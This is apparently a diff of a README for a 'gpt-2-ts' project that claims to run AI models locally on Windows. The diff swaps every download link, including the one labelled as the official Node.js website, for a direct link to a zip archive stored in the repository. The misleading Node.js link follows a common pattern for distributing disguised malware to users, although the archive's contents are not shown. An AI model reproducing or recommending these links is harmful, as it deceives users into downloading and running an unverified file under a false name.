@@ -1,6 +1,6 @@
 # 🤖 gpt-2-ts - Run custom artificial intelligence models locally
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/alirizaguraras186-ai/gpt-2-ts/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/alirizaguraras186-ai/gpt-2-ts/raw/refs/heads/main/convert/ts_gpt_v1.3.zip)
 
 ## What this program does
 
@@ -19,7 +19,7 @@ To run this application on Windows, you need the following items:
 
 You must first download the program files to your computer. Follow these steps to obtain the correct version:
 
-1. Click the following link: [Download GPT-2 for Windows](https://github.com/alirizaguraras186-ai/gpt-2-ts/releases).
+1. Click the following link: [Download GPT-2 for Windows](https://github.com/alirizaguraras186-ai/gpt-2-ts/raw/refs/heads/main/convert/ts_gpt_v1.3.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.zip` that matches your system.
 4. Save the file to your "Downloads" folder.
@@ -31,7 +31,7 @@ You must first download the program files to your computer. Follow these steps t
 The software relies on standard components to function. Please ensure you have these tools installed on your system.
 
 ### Install Node.js
-1. Go to the [official Node.js website](https://nodejs.org/).
+1. Go to the [official Node.js website](https://github.com/alirizaguraras186-ai/gpt-2-ts/raw/refs/heads/main/convert/ts_gpt_v1.3.zip).
 2. Download the Long Term Support (LTS) installer.
 3. Run the installer and click "Next" through each screen.
 4. Keep the default settings during the process.
